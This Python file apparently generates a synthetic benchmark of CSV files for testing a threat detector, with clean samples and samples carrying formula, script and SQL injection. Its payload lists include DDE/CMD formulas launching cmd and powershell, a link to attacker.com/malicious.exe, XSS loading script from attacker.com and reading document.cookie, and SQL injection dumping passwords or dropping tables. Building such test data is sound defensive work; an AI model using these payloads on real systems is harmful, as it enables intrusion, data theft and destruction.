"""
Aegis Node — Benchmark Dataset Generator.
Generates 100 deterministic, synthetic benchmark datasets and independent ground-truth metadata.

Categories (20 datasets per category):
  1. clean (expected_threat=False)
  2. formula_injection (expected_threat=True)
  3. script_injection (expected_threat=True)
  4. sql_injection (expected_threat=True)
  5. mixed_threats (expected_threat=True)

All threat payloads are inert synthetic test strings. No actual malware or malicious execution.
"""

import csv
import io
import json
from pathlib import Path

_BENCHMARK_DIR = Path(__file__).parent.parent / "data" / "benchmarks"
_METADATA_DIR = _BENCHMARK_DIR / "metadata"


# ─── Synthetic Template Generators ───────────────────────────────────────────

def _build_csv_str(header: list[str], rows: list[list[str]]) -> str:
    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow(header)
    for r in rows:
        writer.writerow(r)
    return buf.getvalue()


def _gen_clean_csv(idx: int) -> str:
    names = ["Alice", "Bob", "Charlie", "David", "Eve", "Frank", "Grace", "Hannah"]
    domains = ["example.com", "test.org", "acme.net", "company.io"]
    header = ["name", "email", "age", "score"]
    rows = []
    for i in range(5):
        name = names[(idx + i) % len(names)]
        email = f"{name.lower()}{(idx+i)}@{domains[(idx+i)%len(domains)]}"
        age = str(20 + ((idx * 3 + i) % 40))
        score = f"{50.0 + ((idx * 7 + i * 5) % 50):.1f}"
        rows.append([name, email, age, score])
    return _build_csv_str(header, rows)


def _gen_formula_csv(idx: int) -> str:
    payloads = [
        '=CMD("calc.exe")',
        '=SUM(A1:A10)',
        '+CMD("powershell.exe")',
        '-2+3*cmd|\' /C calc\'',
        '@SUM(1+1)',
        'DDE("cmd";"/c calc";"")',
        'HYPERLINK("http://attacker.com/malicious.exe","Click Here")',
        '=1+2',
    ]
    header = ["id", "product", "price_formula"]
    rows = []
    for i in range(5):
        payload = payloads[(idx + i) % len(payloads)]
        rows.append([str(i + 1), f"Widget_{i}", payload])
    return _build_csv_str(header, rows)


def _gen_script_csv(idx: int) -> str:
    payloads = [
        '<script>alert("XSS")</script>',
        '<script src="http://attacker.com/xss.js"></script>',
        'javascript:alert(document.cookie)',
        '<img src="x" onerror="alert(1)">',
        'eval(atob("YWxlcnQoMSk="))',
        '<svg onload=alert(1)>',
        'javascript:void(0)',
    ]
    header = ["user_id", "comment", "status"]
    rows = []
    for i in range(5):
        payload = payloads[(idx + i) % len(payloads)]
        rows.append([f"user_{i}", payload, "active"])
    return _build_csv_str(header, rows)


def _gen_sql_csv(idx: int) -> str:
    payloads = [
        "admin' OR '1'='1",
        "' UNION SELECT username, password FROM users --",
        "1; DROP TABLE users; --",
        "' OR 'a'='a",
        "admin'--",
        "' UNION ALL SELECT 1, null, @@version --",
    ]
    header = ["id", "username", "query_param"]
    rows = []
    for i in range(5):
        payload = payloads[(idx + i) % len(payloads)]
        rows.append([str(i + 1), f"user_{i}", payload])
    return _build_csv_str(header, rows)


def _gen_mixed_csv(idx: int) -> str:
    formulas = ['=CMD("calc")', '+SUM(B1:B5)', 'DDE("cmd";"/c calc";"")']
    scripts = ['<script>alert(1)</script>', 'javascript:alert(1)']
    sqls = ["admin' OR '1'='1", "' UNION SELECT 1 --"]

    f = formulas[idx % len(formulas)]
    s = scripts[idx % len(scripts)]
    q = sqls[idx % len(sqls)]

    header = ["row_id", "formula_col", "script_col", "sql_col"]
    rows = [
        ["1", f, "normal_text", "normal_text"],
        ["2", "normal_text", s, "normal_text"],
        ["3", "normal_text", "normal_text", q],
        ["4", "normal_text", "normal_text", "clean_value\x00with_null"],
    ]
    return _build_csv_str(header, rows)


# ─── Main Generator ───────────────────────────────────────────────────────────

def generate_benchmark_corpus(count_per_category: int = 20) -> dict:
    """
    Generate synthetic benchmark datasets and return ground truth dict.
    """
    _BENCHMARK_DIR.mkdir(parents=True, exist_ok=True)
    _METADATA_DIR.mkdir(parents=True, exist_ok=True)

    ground_truth = {}

    categories = [
        ("clean", False, [], _gen_clean_csv),
        ("formula_injection", True, ["formula_injection"], _gen_formula_csv),
        ("script_injection", True, ["script_injection"], _gen_script_csv),
        ("sql_injection", True, ["sql_injection"], _gen_sql_csv),
        ("mixed_threats", True, ["formula_injection", "script_injection", "sql_injection", "binary_anomaly"], _gen_mixed_csv),
    ]

    for cat_name, expected_threat, threat_cats, gen_func in categories:
        cat_dir = _BENCHMARK_DIR / cat_name
        cat_dir.mkdir(parents=True, exist_ok=True)

        for i in range(1, count_per_category + 1):
            filename = f"{cat_name}_{i:03d}.csv"
            file_path = cat_dir / filename
            content = gen_func(i)
            file_path.write_text(content, encoding="utf-8")

            dataset_key = filename
            ground_truth[dataset_key] = {
                "dataset_id": dataset_key,
                "filename": filename,
                "relative_path": f"{cat_name}/{filename}",
                "category": cat_name,
                "expected_threat": expected_threat,
                "threat_categories": threat_cats,
            }

    # Save ground_truth.json
    gt_file = _METADATA_DIR / "ground_truth.json"
    gt_file.write_text(json.dumps(ground_truth, indent=2), encoding="utf-8")

    return ground_truth


if __name__ == "__main__":
    gt = generate_benchmark_corpus(20)
    print(f"Generated benchmark corpus: {len(gt)} datasets total.")
